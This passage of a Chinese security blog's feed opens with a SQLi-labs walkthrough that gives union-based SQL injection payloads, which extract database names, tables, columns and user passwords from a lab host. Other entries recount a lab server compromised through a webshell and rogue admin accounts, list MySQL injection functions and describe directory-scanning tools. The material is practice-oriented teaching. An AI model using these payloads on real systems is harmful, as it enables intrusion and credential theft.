注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-1/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/正常访问结果显示.png" alt="正常访问结果显示"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-1/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=&#39;参数&#39; limit 0，1;</code>，<font color="red">参数为<code>String</code>型而且SQL语句中使用单引号(<code>&#39;</code>)界定该参数</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&#39; or &#39;1&#39;=&#39;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/or恒真payload操作结果.png" alt="1' or '1'='1payload操作结果"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby1操作结果.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/UnionSelect语句判断SQL注入回显点.png" alt="Union Select语句判断SQL注入回显点"></center><p>注：</p><ul><li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li></ul></li><li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,user(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,database(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,version(),3--+</span><span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,@@datadir,3--+</span><span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,@@version_compile_os,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/获取用户信息.png" alt="获取用户信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/获取当前数据库名称.png" alt="获取当前数据库名称"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/获取当前数据库版本信息.png" alt="获取当前数据库版本信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/获取当前数据库所在路径.png" alt="获取当前数据库所在路径"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/获取服务器系统版本.png" alt="获取服务器系统版本"></center></li><li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/爆出所有数据库名称.png" alt="爆出所有数据库名称"></center></li><li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/爆出security数据库中所有的数据表名称.png" alt="爆出security数据库中所有的数据表名称"></center></li><li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/爆出users表所有列名‘.png" alt="爆出users表所有列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,username,password from users where id=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/爆字段值.png" alt="爆字段值"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=&#39;参数&#39;;</code></li><li>未进行转义、过滤等</li><li>可使用单引号判断注入类型</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次被打经历</title>
      <link href="/2020/10/06/ji-yi-ci-bei-da-jing-li/"/>
      <url>/2020/10/06/ji-yi-ci-bei-da-jing-li/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>​        最初学习安全的小白大部分都会拿一些靶场来练习技术，靶场可以放在虚拟机中也可以放在云服务器中。刚好华为云做活动撸到三个月的服务器使用时间，于是就在华为云上搭建了一些安全靶场。</p><p>​        在某一个安全群里面拉了几个小伙伴加入安全讨论组，作为贡献我就把自己搭的靶场分享给了他们。最初说的是人数在5人左右，后来越拉越多人数不受控制，我也就潜水了。</p><h1 id="0x02-起因"><a href="#0x02-起因" class="headerlink" title="0x02 起因"></a>0x02 起因</h1><p>​        今天访问我的服务器靶场时，发现网站的首页被人篡改。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/主页被篡改.png" alt="主页被篡改"></center><p>​        于是就马上登上服务器去查看一下，发现网站主页内容被修改成下图所示内容，确定服务器被黑。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/首页内容被篡改.png" alt="首页内容被篡改"></center><p>​        (这TM黑就黑了吧，还留下这么一句很嚣张的话)</p><h1 id="0x03-发展"><a href="#0x03-发展" class="headerlink" title="0x03 发展"></a>0x03 发展</h1><p>​        既然这个人这么嚣张，应该是渗透的很完美没有留下痕迹，于是就去排查一下系统。</p><ul><li>既然渗透成功作为后渗透的手段都会留下后门，先使用<code>net user</code>查看一下当前系统中存在哪些用户，结果一个很明显的名为：<code>mel</code>的异常账户。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/netuser命令执行结果.png" alt="netuser命令执行结果"></center><ul><li>接着使用<code>net user mel</code>命令查看<code>mel</code>账户相关信息，发现该账户为管理员账户于今天3点左右创建。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/mel账户信息.png" alt="mel账户信息"></center><ul><li>发现存在异常账户后，下一步就去查看系统的日志信息。在运行框中输入<code>eventvwr</code>打开<code>事件查看器</code>主界面。查看Windows中的安全日志时发现在此之前所有的日志信息都被删除掉了。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/Windows安全日志被删除.png" alt="Windows安全日志被删除"></center><ul><li>日志有很多种类，安全日志被清除，但是其他程序的日志信息可能还存在，查找后发现<code>远程桌面服务</code>中有几条<code>mel</code>账号在3点左右的信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/远程桌面服务日志.png" alt="远程桌面服务日志"></center><ul><li>在我查看华为云的云服务器控制台时，系统也提示了“账户异地登录”，发现<code>mel</code>账户确实登陆过本服务器。（就在我开始写这片文章时，另一个名为<code>ad</code>的账户刚刚创建，嚣张呀）</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/账户异地登陆.png" alt="账户异地登陆"></center><ul><li>里面显示了异常登录的源IP地址为：<code>222.222.147.62</code>，社工查了一下IP的地址。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/IPLocal.png" alt="IPLocal"></center><ul><li>测试该IP地址发现不存活。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/主机不存活.png" alt="主机不存活"></center><ul><li>使用<code>nmap -Pn 222.222.147.62</code>仍不能准确测试。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/nmap-Pn扫描结果.png" alt="nmap-Pn扫描结果"></center><h1 id="0x04-高潮"><a href="#0x04-高潮" class="headerlink" title="0x04 高潮"></a>0x04 高潮</h1><ul><li>在phpstudy的网站目录下有其写入或修改的多个文件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/恶意文件.png" alt="恶意文件"></center><ul><li><code>index.html</code>文件内容已经查看过，现在去查看一下<code>j.php</code>和<code>ll.php</code>文件里面的内容。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/恶意文件内容.png" alt="恶意文件内容"></center><ul><li>通过上图发现文件里面都有一句相似的木马，下面使用菜刀测试一下连接。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/菜刀连接.png" alt="菜刀连接"></center><ul><li>尝试使用菜刀虚拟终端创建账户。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/创建账户.png" alt="创建账户"></center><ul><li>由于网站权限比较高，创建的额用户为系统权限。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/新增的本地账户.png" alt="新增的本地账户"></center><ul><li>其中可以看到<code>mel</code>账号的权限比较高为<code>管理员</code>权限，因此其还使用了提权工具提升了账户的权限。</li></ul><h1 id="0x05-结尾"><a href="#0x05-结尾" class="headerlink" title="0x05 结尾"></a>0x05 结尾</h1><p>​        使用<code>systeminfo</code>命令查看系统已安装的补丁，如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Diary/hacker/hacked/系统补丁.png" alt="系统补丁"></center><p>虽然已经安装了将近两百个补丁，但是仍然有很多漏洞，日志文件被清理，也没有在系统中安装监控软件，不能确定其是从那里进入。(主要是太菜了)</p><h1 id="0x06-感想"><a href="#0x06-感想" class="headerlink" title="0x06 感想"></a>0x06 感想</h1><ul><li>技术太菜，被动挨打</li><li>信息外泄，鱼龙混杂</li><li>内网穿透，不屑嘲讽</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacked </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PDF文件中失效链接修改</title>
      <link href="/2020/10/04/pdf-wen-jian-zhong-shi-xiao-lian-jie-xiu-gai/"/>
      <url>/2020/10/04/pdf-wen-jian-zhong-shi-xiao-lian-jie-xiu-gai/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><p>​        <strong>PDF</strong>（<strong>Portable Document Format</strong>的简称，意为“可携带文档格式”），是由Adobe Systems用于与应用程序、操作系统、硬件无关的方式进行文件交换所发展出的文件格式。PDF文件以PostScript语言图象模型为基础，无论在哪种打印机上都可保证精确的颜色和准确的打印效果，即PDF会忠实地再现原稿的每一个字符、颜色以及图象。</p><p>​        Adobe公司设计PDF文件格式的目的，是跨平台支持多媒体集成信息的出版和发布，尤其是提供对网络信息发布的支持。为了达到此目的， PDF具有许多其他电子文档格式无法相比的优点。PDF文件格式可以将文字、字型、格式、颜色及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含<a href="https://baike.baidu.com/item/超文本链接/9705990" target="_blank" rel="noopener">超文本链接</a>、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都较高。</p><p>​        对普通读者而言，用PDF制作的电子书具有纸版书的质感和阅读效果，可以逼真地展现原书的原貌，而显示大小可任意调节，给读者提供了个性化的阅读方式。</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>​        这里的链接具体值的是超文本链接(Hypertext link)也即超链接，是指用文字链接的形式来指向一个页面。超链接可以是一个<strong>URL</strong>、文件地址，也可以是一个邮件链接。</p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>​        超链接是文件中常用到的一种引用跳转、打开引文等操作的方式，在PDF文件也可以实现超链接的跳转效果。超链接地址因为是跳转到外部页面，所以无法保证跳转的链接是否有效或失效，在Word、Markdown等文本文件中若超链接失效则只需要打开文件修改对应超链接地址即可，但是对于一些二进制文件，如：PDF文件等，其中的失效超链接就需要使用一些PDF编辑器来修改其中的链接。</p><h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>PDF编辑软件：FoxitPhantomPDF</li></ul><h2 id="失效链接"><a href="#失效链接" class="headerlink" title="失效链接"></a>失效链接</h2><ul><li>当鼠标指向超链接位置时，鼠标会变成一个手型。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Ingenuity/PDFLinks/PDF超链接.png" alt="PDF超链接"></center><ul><li>单击超链接即可在浏览器中打开指定链接。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Ingenuity/PDFLinks/超链接失效.png" alt="超链接失效"></center><h1 id="0x03-操作"><a href="#0x03-操作" class="headerlink" title="0x03 操作"></a>0x03 操作</h1><ol><li><p>查找一个新的替换链接并复制。如：脚本之家网站中的一篇《Safari浏览器代理设置》-<a href="https://www.jb51.net/softjc/644282.html。" target="_blank" rel="noopener">https://www.jb51.net/softjc/644282.html。</a></p></li><li><p>使用<strong>FoxitPhantomPDF</strong>打开待修改的PDF文件，【编辑】-&gt; 【链接】，右键待修改的超链接并选择【属性】选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Ingenuity/PDFLinks/打开链接属性选项.png" alt="打开链接属性选项"></center></li><li><p>选择【动作】选项卡，选中链接后单击【编辑】按钮，将失效链接替换成我们新查找到的链接。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Ingenuity/PDFLinks/替换失效链接.png" alt="替换失效链接"></center></li><li><p>重新单击超链接即可在浏览器中打开指定链接。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Ingenuity/PDFLinks/成功打开超链接.png" alt="成功打开超链接"></center></li></ol><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><ul><li><a href="https://baike.baidu.com/item/pdf/317608?fr=aladdin" target="_blank" rel="noopener">pdf(便携式文档格式）</a></li><li><a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC%E9%93%BE%E6%8E%A5/9705990" target="_blank" rel="noopener">超文本链接</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入常用函数</title>
      <link href="/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/"/>
      <url>/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>system_user()</code></td><td align="center">系统函数名</td></tr><tr><td align="center"><code>user()</code></td><td align="center">用户名</td></tr><tr><td align="center"><code>current_user()</code></td><td align="center">当前用户名</td></tr><tr><td align="center"><code>session_user()</code></td><td align="center">连接数据库的用户名</td></tr><tr><td align="center"><code>database()</code></td><td align="center">数据库名</td></tr><tr><td align="center"><code>versionI()</code></td><td align="center">数据库版本</td></tr><tr><td align="center"><code>@@datadir</code></td><td align="center">数据库路径</td></tr><tr><td align="center"><code>@@basedir</code></td><td align="center">数据库安装路径</td></tr><tr><td align="center"><code>@@version_compile_os</code></td><td align="center">操作系统</td></tr><tr><td align="center"><code>count()</code></td><td align="center">返回执行结果的数量</td></tr><tr><td align="center"><code>concat()</code></td><td align="center">没有分隔符的连接字符串</td></tr><tr><td align="center"><code>concat_ws()</code></td><td align="center">含有分隔符的连接字符串</td></tr><tr><td align="center"><code>load_file()</code></td><td align="center">读取本地的文件</td></tr><tr><td align="center"><code>into outfile</code></td><td align="center">写文件</td></tr><tr><td align="center"><code>ascii()</code></td><td align="center">字符串的ASCII代码值</td></tr><tr><td align="center"><code>ord()</code></td><td align="center">返回字符串第一个字符的ASCII值</td></tr><tr><td align="center"><code>mid()</code></td><td align="center">返回一个字符串的一部分</td></tr><tr><td align="center"><code>substr()</code></td><td align="center">返回7一个字符串的一部分</td></tr><tr><td align="center"><code>length()</code></td><td align="center">返回字符串的长度</td></tr><tr><td align="center"><code>left()</code></td><td align="center">返回字符串左面的几个字符</td></tr><tr><td align="center"><code>floor()</code></td><td align="center">返回小于或等于x的最大整数</td></tr><tr><td align="center"><code>rand()</code></td><td align="center">返回0和1之间的随机数</td></tr><tr><td align="center"><code>sleep()</code></td><td align="center">让此语句运行n秒钟</td></tr><tr><td align="center"><code>if()</code></td><td align="center"><code>select if (1&gt;2,2,3);  -&gt;3</code></td></tr><tr><td align="center"><code>strcmp()</code></td><td align="center">比较字符串的内容</td></tr><tr><td align="center"><code>ifnull()</code></td><td align="center">假如参数1不为null,则返回值为参数1,否则返回值为参数2</td></tr><tr><td align="center"><code>exp()</code></td><td align="center">返回e的x次方</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常规信息收集之路径</title>
      <link href="/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-lu-jing/"/>
      <url>/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-lu-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="状态码浅析"><a href="#状态码浅析" class="headerlink" title="状态码浅析"></a>状态码浅析</h1><ul><li>200 OK<ul><li>客户端请求成功，响应主题包含请求的结果</li></ul></li><li>400 Bad Request<ul><li>客户端请求有语法错误，不能被服务器所理解，比如：URL插入无效的字符</li></ul></li><li>401 Unauthorized<ul><li>请求未经授权，被允许之前需要进行HTTP身份认证，<code>WWW-Authenticate</code>消息头说明所支持的身份验证类型</li></ul></li><li>403 Forbidden<ul><li>禁止所有人访问被请求的资源</li></ul></li><li>404 Not Fouond<ul><li>请求资源不存在</li></ul></li><li>405 Method not allowed<ul><li>用了不支持的请求方法</li></ul></li><li>503 Server Unavailable<ul><li>服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li></ul></li></ul><h1 id="路径扫描工具"><a href="#路径扫描工具" class="headerlink" title="路径扫描工具"></a>路径扫描工具</h1><h2 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h2><ul><li>返回状态码</li><li>返回内容正则判断</li><li>返回头</li><li>返回内容大小</li><li>目录字典</li></ul><h2 id="FileScan"><a href="#FileScan" class="headerlink" title="FileScan"></a>FileScan</h2><p>链接：</p><ul><li><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">FileScan</a></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/DirSearch/FileScan.png" alt="FileScan扫描"></center><h2 id="DirMap"><a href="#DirMap" class="headerlink" title="DirMap"></a>DirMap</h2><p>链接：</p><ul><li><a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">DirMap</a></li></ul><p>描述：</p><ul><li>一个高级Web目录扫描工具</li><li>功能强于DirBuster、Dirsearch、cansina、御剑</li><li>需要python3环境</li></ul><p>功能特点：</p><ol><li>支持n个target*n个payload并发</li><li>支持递归扫描</li><li>支持自定义需要递归扫描的状态码</li><li>支持(单|多)字典扫描</li><li>支持自定义字符集爆破</li><li>支持爬虫动态字典扫描</li><li>支持自定义标签fuzz目标url</li><li>自定义请求User-Agent</li><li>自定义请求随机延时</li><li>自定义请求超时时间</li><li>自定义请求代理</li><li>自定义正则表达式匹配假性404页面</li><li>自定义要处理的响应状态码</li><li>自定义跳过大小为x的页面</li><li>自定义显示content-type</li><li>自定义显示页面大小</li><li>按域名去重复保存结果</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/DirSearch/dirmap扫描.png" alt="dirmap扫描"></center><h2 id="7kbscan"><a href="#7kbscan" class="headerlink" title="7kbscan"></a>7kbscan</h2><p>描述：</p><ul><li>可设置延迟扫描时间，伪装成正常访问流量</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/DirSearch/7kbscan扫描.png" alt="7kbscan扫描"></center><h2 id="御剑后台扫描"><a href="#御剑后台扫描" class="headerlink" title="御剑后台扫描"></a>御剑后台扫描</h2><p>描述：</p><ul><li>需要.Net Framework3.5环境</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/DirSearch/御剑后台扫描.png" alt="御剑后台扫描"></center><h1 id="另类猜测思路"><a href="#另类猜测思路" class="headerlink" title="另类猜测思路"></a>另类猜测思路</h1><ul><li>查看已知URL链接，看命名是否规律</li><li>若存在规则<code>(英文名称+首字母大写等)</code>，则按照此规则爆破后台</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常规信息收集之指纹</title>
      <link href="/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-zhi-wen/"/>
      <url>/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-zhi-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h1><h1 id="收集方法"><a href="#收集方法" class="headerlink" title="收集方法"></a>收集方法</h1><h2 id="第三方收集"><a href="#第三方收集" class="headerlink" title="第三方收集"></a>第三方收集</h2><h3 id="云悉指纹"><a href="#云悉指纹" class="headerlink" title="云悉指纹"></a>云悉指纹</h3><p>链接：</p><ul><li><a href="https://www.yunsee.cn/" target="_blank" rel="noopener">云悉指纹</a></li></ul><p>描述：</p><ul><li>未登录用户只能查看部分信息</li><li>屏蔽某些网址的指纹识别</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Port/云悉指纹.png" alt="云悉指纹"></center><h3 id="潮汐指纹"><a href="#潮汐指纹" class="headerlink" title="潮汐指纹"></a>潮汐指纹</h3><p>链接：</p><ul><li><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">潮汐指纹</a></li></ul><p>描述：</p><ul><li>只对注册用户开放</li></ul><h2 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h2><h3 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h3><p>描述：</p><ul><li>Wappalyzer是一款能够分析目标网站所采用的平台框架、网站环境、服务器配置环境、JavaScript框架、编程语言等参数的Chrome网站技术分析插件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Port/Wappalyzer指纹识别.png" alt="Wappalyzer指纹识别"></center>]]></content>
